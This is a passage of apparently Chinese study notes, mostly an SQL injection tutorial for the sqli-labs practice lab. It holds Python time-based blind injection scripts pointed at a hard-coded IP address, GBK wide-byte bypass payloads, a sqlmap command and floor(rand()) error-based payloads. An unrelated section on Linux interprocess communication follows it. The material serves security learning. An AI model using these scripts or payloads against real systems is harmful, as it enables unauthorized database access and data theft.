&lt;h3&gt;&lt;span id=&#34;脚本实现时间盲注&#34;&gt; 脚本实现时间盲注&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;获取数据库名长度&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
import datetime&lt;br&gt;
# 获取数据库名长度&lt;br&gt;
 def database_len ():&lt;br&gt;
for i in range(1, 10):&lt;br&gt;
url = ‘’‘&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/&lt;/a&gt;’’’&lt;br&gt;
payload = ‘’’?id=1’ and if(length(database())=%d,sleep(3),1)–+’’’ %i&lt;br&gt;
time1 = datetime.datetime.now()&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
time2 = datetime.datetime.now()&lt;br&gt;
sec = (time2 - time1).seconds&lt;br&gt;
if sec &amp;gt;= 3:&lt;br&gt;
print(‘database_len:’, i)&lt;br&gt;
break&lt;br&gt;
else:&lt;br&gt;
print(i)&lt;br&gt;
database_len()&lt;/li&gt;
&lt;li&gt;获取数据库名&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
import datetime&lt;br&gt;
# 获取数据库名&lt;br&gt;
 def database_name ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1, 9):&lt;br&gt;
for i in ‘0123456789abcdefghijklmnopqrstuvwxyz_’:&lt;br&gt;
url = ‘’‘&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/&lt;/a&gt;’’’&lt;br&gt;
payload = ‘’’?id=1’ and if(substr(database(),%d,1)=’%s’,sleep(1),1) --+’’’ % (j,i)&lt;br&gt;
time1 = datetime.datetime.now()&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
time2 = datetime.datetime.now()&lt;br&gt;
sec = (time2 - time1).seconds&lt;br&gt;
if sec &amp;gt;= 1:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘database_name:’, name)&lt;br&gt;
database_name()&lt;br&gt;
 获取表名、字段名、字段信息等数据的脚本类似上面布尔盲注脚本&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;宽字节注入&#34;&gt; 宽字节注入&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;br&gt;
宽字节注入是利用 mysql 的一个特性，mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字【前一个 ascii 码要大于 128，才到汉字的范围】&lt;br&gt;
在 PHP 配置文件中 magic_quotes_gpc=On 或者使用 addslashes 函数，icov 函数，mysql_real_escape_string 函数、mysql_escape_string 函数等，提交的参数中如果带有单引号’，  就会被自动转义’，这样就使得多数注入攻击无效。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当输入单引号，假设这里我们使用 addslashes 转义，对应的 url 编码是：&lt;br&gt;
’ –&amp;gt;’–&amp;gt; %5c%27&lt;br&gt;
 当在前面引入一个 ASCII 大于 128 的字符【比如 % df、% aa】，url 编码变为：&lt;br&gt;
% df’ –&amp;gt; % df’ –&amp;gt; (% df%5C)%27–&amp;gt;(数据库 GBK)–&amp;gt; 運’&lt;br&gt;
前端输入 % df’时首先经过上面 addslashes 函数和浏览器 url 编码转义变成了 % df%5c%27&lt;/p&gt;
&lt;p&gt;因为数据库使用 GBK 编码的话，% df%5c 会被当作一个汉字处理，转换成了汉字” 運”，从而使 %27（单引号）逃出生天，成功绕过，利用这个特性从而可实施 SQL 注入的利用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实战&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;手工注入&lt;br&gt;
可以使用 union 联合注入方法&lt;br&gt;
比如：?id=1% aa’ order by 1 --+&lt;br&gt;
?id=1%df’ order by 1 --+&lt;br&gt;
 这里表名 table_name 的值必须转换成 16 进制，如果不用 16 进制就得用引号包裹，当有 addlashes 函数就会转义引号，就会导致查询失败，使用 16 进制避免了这个问题。&lt;/li&gt;
&lt;li&gt;相类似操作进行爆库、爆表、爆值&lt;/li&gt;
&lt;li&gt;sqlmap&lt;br&gt;
sqlmap -u “&lt;a href=&#34;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1�&lt;/a&gt;’”&lt;/li&gt;
&lt;li&gt;脚本实现注入&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;堆叠注入&#34;&gt; 堆叠注入&lt;/span&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span id=&#34;过滤&#34;&gt; 过滤&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;爆库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cyberangel 的知识库&lt;/p&gt;
&lt;p&gt;- floor()&lt;/p&gt;
&lt;p&gt;&amp;gt; floor 函数的作用是返回小于等于该值的最大整数，也可以理解为向下取整，只保留整数部分&lt;/p&gt;
&lt;p&gt;-  &lt;code&gt;GROUP BY&lt;/code&gt;  语句用于&lt;mark&gt;结合合计函数&lt;/mark&gt;，根据一个或多个列对结果集进行分组。&lt;br&gt;
-  &lt;code&gt;GROUP BY column_name&lt;/code&gt; &lt;br&gt;
-  &lt;code&gt;COUNT(column_name) &lt;/code&gt; 函数返回指定列的值的数目（NULL 不计入）&lt;br&gt;
-  &lt;code&gt;COUNT(*) &lt;/code&gt; 函数返回表中的记录数&lt;br&gt;
 -  &lt;code&gt;COUNT(DISTINCT column_name) &lt;/code&gt; 函数返回指定列的不同值的数目&lt;br&gt;
 -  &lt;code&gt;rand()&lt;/code&gt;  函数生成 0~1 之间的随机数，可以给定一个随机数的种子&lt;br&gt;
 - 查询的时候如果使用 rand () 的话，该值会被计算多次&lt;br&gt;
 - 在&lt;mark&gt;使用 group by 的时候&lt;/mark&gt;，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，&lt;mark&gt;插入虚表的时候&lt;/mark&gt;会再被执行一次&lt;br&gt;
 - 整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要 3 条数据，使用该语句才会报错的原因。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select count(),(concat(floor(rand(0)*2)),(select version()))) x from users group by x&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;- x 是别名&lt;/p&gt;
&lt;p&gt;&amp;gt; 报错的原因：主要是因为虚拟表的主键重复&lt;br&gt;
 &amp;gt;&lt;br&gt;
&amp;gt;&lt;br&gt;
&amp;gt;&lt;br&gt;
&amp;gt;  &lt;code&gt;1&#39;and (select 1 from (select count(*),concat(&#39;~&#39;,database(),&#39;~&#39;,floor(rand(0)*2))as x from information_schema.tables group by x)a))#&lt;/code&gt; &lt;br&gt;
&amp;gt; 嵌套查询原因：里面的查询结果是一个虚拟表，所以需要外套一个查询语句。&lt;/p&gt;
&lt;hr class=&#34;footnotes-sep&#34;&gt;
&lt;section class=&#34;footnotes&#34;&gt;
&lt;ol class=&#34;footnotes-list&#34;&gt;
&lt;li id=&#34;fn1&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;GFs &lt;a href=&#34;#fnref1&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn2&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;A-H &lt;a href=&#34;#fnref2&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;

 &lt;h2&gt;&lt;span id=&#34;常见的通信方式&#34;&gt; 常见的通信方式&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;管道 pipe：管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系的进程间使用。进程的亲缘关系通常是指父子进程关系。&lt;/li&gt;
&lt;li&gt;命名管道 FIFO：有名管道也是半双工的通信方式，但是它允许无亲缘关系进程间的通信。&lt;/li&gt;
&lt;li&gt;消息队列 MessageQueue：消息队列是由消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。&lt;/li&gt;
&lt;li&gt;共享存储 SharedMemory：共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号两，配合使用，来实现进程间的同步和通信。&lt;/li&gt;
&lt;li&gt;信号量 Semaphore：信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。因此，主要作为进程间以及同一进程内不同线程之间的同步手段。&lt;/li&gt;
&lt;li&gt;套接字 Socket：套解口也是一种进程间通信机制，与其他通信机制不同的是，它可用于不同及其间的进程通信。&lt;/li&gt;
&lt;li&gt;信号 (sinal) ： 信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生。&lt;/li&gt;
&lt;/ol&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;管道&#34;&gt; 管道&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;管道是操作系统中常见的一种进程间通信方式，它使用于所有 POSIX 系统以及 Windows 系列产品。&lt;/p&gt;
&lt;p&gt;管道也是 unix ipc 的最老形式，管道有两种限制：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据自己读不能自己写&lt;/li&gt;
&lt;li&gt;它们是半双工的。数据只能在一个方向上流动。&lt;/li&gt;
&lt;li&gt;数据一旦被读走，便不在管道中存在，不可反复读取。&lt;/li&gt;
&lt;li&gt;它们只能在具有公共祖先的进程之间使用。通常，一个管道由一个进程创建，然后该进程调用 fork, 此后父、子进程之间就可应用该管道。&lt;/li&gt;
&lt;/ol&gt;

 &lt;!-- toc --&gt;
